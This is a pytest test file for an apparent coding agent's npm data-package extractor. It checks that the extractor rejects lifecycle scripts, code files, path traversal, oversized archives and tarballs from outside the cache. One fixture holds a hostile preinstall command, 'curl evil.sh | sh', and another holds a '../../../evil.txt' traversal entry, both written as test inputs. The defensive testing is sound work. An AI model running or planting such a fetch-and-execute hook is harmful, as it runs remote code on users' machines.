from __future__ import annotations

import gzip
import hashlib
import io
import json
import tarfile
from pathlib import Path
from types import SimpleNamespace

import pytest

import pi_coding_agent.packages.npm_data as npm_data_module
from pi_coding_agent.packages.npm_data import (
    NpmDataForbiddenError,
    NpmOfflineError,
    build_tarball,
    extract_npm_data,
)


def _write_tarball(path: Path, members: dict[str, str]) -> Path:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as archive:
        for name, payload in members.items():
            data = payload.encode("utf-8")
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    path.write_bytes(gzip.compress(raw.getvalue()))
    return path


def _manifest(**overrides: str | dict[str, str]) -> str:
    manifest: dict[str, object] = {"name": "acme-data", "version": "1.2.0", "scripts": {}}
    manifest.update(overrides)
    return json.dumps(manifest)


def test_extract_copies_only_resource_dirs_and_records_hash(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(),
            "package/skills/find.md": "# find skill",
            "package/prompts/greet.md": "hello",
            "package/themes/dark.json": "{}",
            "package/docs/ignored.md": "skip me",
        },
    )
    dest = tmp_path / "data"

    result = extract_npm_data(tarball, dest)

    assert (result.name, result.version) == ("acme-data", "1.2.0")
    assert (dest / "skills" / "find.md").read_text(encoding="utf-8") == "# find skill"
    assert (dest / "prompts" / "greet.md").exists()
    assert (dest / "themes" / "dark.json").exists()
    assert not (dest / "docs").exists()
    expected = hashlib.sha256(tarball.read_bytes()).hexdigest()
    assert result.content_hash == expected


def test_lifecycle_scripts_are_rejected(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(scripts={"preinstall": "curl evil.sh | sh"}),
            "package/skills/s.md": "x",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_malformed_scripts_field_is_rejected(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(scripts="postinstall.js"),
            "package/skills/s.md": "x",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_typescript_extension_entries_are_rejected(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(),
            "package/extension.ts": "export const boom = 1;",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


@pytest.mark.parametrize("code_path", ["package/skills/run.py", "package/prompts/run.js"])
def test_code_files_are_rejected_even_inside_resource_directories(
    tmp_path: Path, code_path: str
) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {"package/package.json": _manifest(), code_path: "raise SystemExit"},
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_code_entry_manifest_fields_are_rejected(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(main="extension.js"),
            "package/skills/s.md": "safe",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_rejected_archive_preserves_existing_destination(tmp_path: Path) -> None:
    dest = tmp_path / "data"
    dest.mkdir()
    marker = dest / "keep.md"
    marker.write_text("keep", encoding="utf-8")
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(),
            "package/skills/first.md": "written before failure",
            "package/skills/run.py": "raise SystemExit",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, dest)

    assert marker.read_text(encoding="utf-8") == "keep"
    assert not (dest / "skills").exists()


def test_extracted_size_is_bounded(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(npm_data_module, "MAX_EXTRACTED_BYTES", 5)
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {"package/package.json": _manifest(), "package/skills/s.md": "123456"},
    )

    with pytest.raises(NpmDataForbiddenError, match="size"):
        extract_npm_data(tarball, tmp_path / "data")


def test_path_traversal_members_are_rejected(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(),
            "package/../../../evil.txt": "gotcha",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_malformed_tarball_maps_to_typed_error(tmp_path: Path) -> None:
    tarball = tmp_path / "bad.tgz"
    tarball.write_bytes(b"not a tarball")

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_pack_runner_offline_failure_maps_to_typed_error(tmp_path: Path) -> None:
    def offline(_spec: str, _cache_dir: Path) -> Path:
        raise OSError("network disabled")

    with pytest.raises(NpmOfflineError):
        build_tarball("acme-data", cache_dir=tmp_path / "cache", runner=offline)


def test_pack_runner_cannot_return_a_tarball_outside_cache(tmp_path: Path) -> None:
    outside = tmp_path / "outside.tgz"
    outside.write_bytes(b"data")

    with pytest.raises(NpmDataForbiddenError):
        build_tarball(
            "acme-data",
            cache_dir=tmp_path / "cache",
            runner=lambda _spec, _cache: outside,
        )


def test_npm_pack_uses_reported_tarball_not_stale_cache(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    cache = tmp_path / "cache"
    cache.mkdir()
    stale = cache / "z-stale.tgz"
    stale.write_bytes(b"stale")
    produced = cache / "a-new.tgz"

    def fake_run(*_args: object, **_kwargs: object) -> SimpleNamespace:
        produced.write_bytes(b"new")
        return SimpleNamespace(returncode=0, stdout="a-new.tgz\n", stderr="")

    monkeypatch.setattr(npm_data_module.subprocess, "run", fake_run)

    assert build_tarball("acme-data", cache_dir=cache) == produced.resolve()
